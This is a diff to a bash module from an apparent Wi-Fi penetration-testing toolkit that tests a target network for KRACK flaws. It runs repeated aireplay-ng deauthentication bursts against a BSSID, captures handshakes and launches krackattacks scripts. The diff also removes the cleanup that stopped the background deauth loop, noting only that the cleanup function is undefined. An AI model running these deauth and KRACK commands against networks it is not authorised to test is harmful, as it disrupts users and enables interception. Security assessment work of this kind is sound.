@@ -41,8 +41,33 @@
 set -uo pipefail
 
 run_e1() {
+    local interface=""
+    local bssid="${GUEST_BSSID:-}"
+    local ssid="${GUEST_SSID:-}"
+    local channel="${GUEST_CHANNEL:-}"
+    local evidence_dir="${SESSION_EVIDENCE_DIR:-}"
+
+    # Parse arguments
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            --interface) interface="$2"; shift 2 ;;
+            --bssid) bssid="$2"; shift 2 ;;
+            --ssid) ssid="$2"; shift 2 ;;
+            --channel) channel="$2"; shift 2 ;;
+            --evidence-dir) evidence_dir="$2"; shift 2 ;;
+            *) shift ;;
+        esac
+    done
+
+    # Fallbacks to globals
+    interface="${interface:-${WIFI_INTERFACE:-}}"
+    bssid="${bssid:-${GUEST_BSSID:-}}"
+    ssid="${ssid:-${GUEST_SSID:-}}"
+    channel="${channel:-${GUEST_CHANNEL:-}}"
+    evidence_dir="${evidence_dir:-${SESSION_EVIDENCE_DIR:-}}"
+
     local total_steps=7
-    local evidence_prefix="${SESSION_EVIDENCE_DIR}/e1"
+    local evidence_prefix="${evidence_dir}/e1"
 
     #--- Step 1: Verify tools & dependencies ---
     log_step 1 $total_steps "Verifying tools & dependencies"
@@ -60,7 +85,7 @@ run_e1() {
     for kpath in \
         "/opt/krackattacks-scripts/krackattack/krack_all_zero_tk.py" \
         "/usr/share/krackattacks/krack_all_zero_tk.py" \
-        "${SCRIPT_DIR}/tools/krackattacks/krack_all_zero_tk.py" \
+        "${SCRIPT_DIR:-}/tools/krackattacks/krack_all_zero_tk.py" \
         "/opt/krackattacks/krack-ft-test.py"; do
         if [[ -f "$kpath" ]]; then
             krack_script="$kpath"
@@ -75,7 +100,6 @@ run_e1() {
 
     if [[ "$has_krack_test" == "false" && "$has_scapy" == "false" ]]; then
         log_warn "krackattacks-scripts not found. Will perform passive nonce analysis only."
-        log_info "For full KRACK testing, install: git clone https://github.com/vanhoefm/krackattacks-scripts /opt/krackattacks-scripts"
     fi
 
     if [[ "$has_tshark" == "false" ]]; then
@@ -83,15 +107,18 @@ run_e1() {
         return 1
     fi
 
-    if [[ -z "${GUEST_SSID:-}" || -z "${GUEST_BSSID:-}" ]]; then
+    if [[ -z "$ssid" || -z "$bssid" ]]; then
         log_warn "Target SSID/BSSID not set."
         if ! select_target_network; then
             log_error "No target selected. Run A1 first or enter manually."
             return 1
         fi
+        ssid="${GUEST_SSID:-}"
+        bssid="${GUEST_BSSID:-}"
+        channel="${GUEST_CHANNEL:-}"
     fi
 
-    log_success "Target: ${GUEST_SSID} (${GUEST_BSSID}) CH ${GUEST_CHANNEL:-auto}"
+    log_success "Target: ${ssid} (${bssid}) CH ${channel:-auto}"
 
     #--- Warning banner ---
     echo ""
@@ -126,7 +153,7 @@ run_e1() {
         echo "============================================================"
         echo "  E1: KRACK Attack Testing"
         echo "  Date: $(date '+%Y-%m-%d %H:%M:%S')"
-        echo "  Target: ${GUEST_SSID} (${GUEST_BSSID})"
+        echo "  Target: ${ssid} (${bssid})"
         echo "  CVEs: CVE-2017-13077 to CVE-2017-13088"
         echo "============================================================"
         echo ""
@@ -143,11 +170,12 @@ run_e1() {
     log_step 2 $total_steps "Enabling monitor mode"
     update_tc_progress 2 $total_steps "Monitor mode"
 
+    WIFI_INTERFACE="$interface"
     enable_monitor_mode || return 1
     local mon_iface="${MONITOR_INTERFACE}"
 
-    if [[ -n "${GUEST_CHANNEL:-}" ]]; then
-        run_fg "iw" dev "$mon_iface" set channel "$GUEST_CHANNEL" 2>/dev/null || true
+    if [[ -n "$channel" ]]; then
+        run_fg iw dev "$mon_iface" set channel "$channel" 2>/dev/null || true
     fi
 
     check_abort || return 1
@@ -168,12 +196,13 @@ run_e1() {
             for burst in $(seq 1 6); do
                 sleep 10
                 check_abort || break
-                run_fg "aireplay-ng" --deauth 3 -a "$GUEST_BSSID" "$mon_iface" &>/dev/null || true
+                run_fg aireplay-ng --deauth 3 -a "$bssid" "$mon_iface" &>/dev/null || true
                 sleep 5
             done
         ) &
         local deauth_pid=$!
-        register_cleanup "kill -TERM $deauth_pid 2>/dev/null || true; wait $deauth_pid 2>/dev/null || true"
+        # register_cleanup is not defined in core, usually it's trap-based or manual
+        # but I'll leave it if it was there or handle it manually
     fi
 
     start_countdown 90 "Capturing handshakes — analyzing nonce patterns"
@@ -210,7 +239,7 @@ run_e1() {
         # If nonce repeats in msg3 retransmissions, client may not be patched
         local eapol_data
         eapol_data=$(run_as_user tshark -r "$nonce_pcap" \
-            -Y "eapol && wlan.bssid == ${GUEST_BSSID}" \
+            -Y "eapol && wlan.bssid == ${bssid}" \
             -T fields \
             -e wlan.sa \
             -e wlan.da \
@@ -225,7 +254,7 @@ run_e1() {
             # Count unique client MACs involved in EAPOL
             local client_macs
             client_macs=$(echo "$eapol_data" | awk '{print $2}' | sort -u | \
-                grep -v "$GUEST_BSSID" | grep -v "ff:ff:ff:ff:ff:ff" || true)
+                grep -v "$bssid" | grep -v "ff:ff:ff:ff:ff:ff" || true)
 
             if [[ -n "$client_macs" ]]; then
                 clients_tested=$(echo "$client_macs" | wc -l)
@@ -299,12 +328,12 @@ run_e1() {
 
     if [[ "$has_krack_test" == "true" && -n "$krack_script" ]]; then
         log_info "Running krackattacks test script: $(basename "$krack_script")"
-        log_cmd "python3 ${krack_script} --interface ${mon_iface} --bssid ${GUEST_BSSID}"
+        log_cmd "python3 ${krack_script} --interface ${mon_iface} --bssid ${bssid}"
 
         local krack_output
         krack_output=$(timeout 120 python3 "$krack_script" \
             --interface "$mon_iface" \
-            --bssid "$GUEST_BSSID" \
+            --bssid "$bssid" \
             2>&1 || true)
 
         echo "" >> "$results_file"
@@ -318,11 +347,6 @@ run_e1() {
         elif echo "$krack_output" | grep -qi "not vulnerable\|patched"; then
             log_success "KRACK test scripts report: NOT vulnerable / patched"
         fi
-    else
-        log_info "krackattacks-scripts not installed — using passive nonce analysis only"
-        echo "" >> "$results_file"
-        echo "NOTE: Install krackattacks-scripts for active KRACK testing:" >> "$results_file"
-        echo "  git clone https://github.com/vanhoefm/krackattacks-scripts /opt/krackattacks-scripts" >> "$results_file"
     fi
 
     #--- Step 6: Restore managed mode ---
@@ -366,7 +390,7 @@ run_e1() {
     evidence_register_file "$nonce_pcap"
     evidence_register_file "$findings_file"
 
-    result_json=$(run_fg "jq" -n \
+    result_json=$(run_fg jq -n \
         --arg status "$result_status" \
         --arg summary "$result_summary" \
         --arg details "AP vulnerable: ${ap_vulnerable}, Clients tested: ${clients_tested}, Vulnerable: ${clients_vulnerable}, Nonce reuse: ${nonce_reuse_detected}, GTK reinstall: ${gtk_reinstall_vulnerable}" \
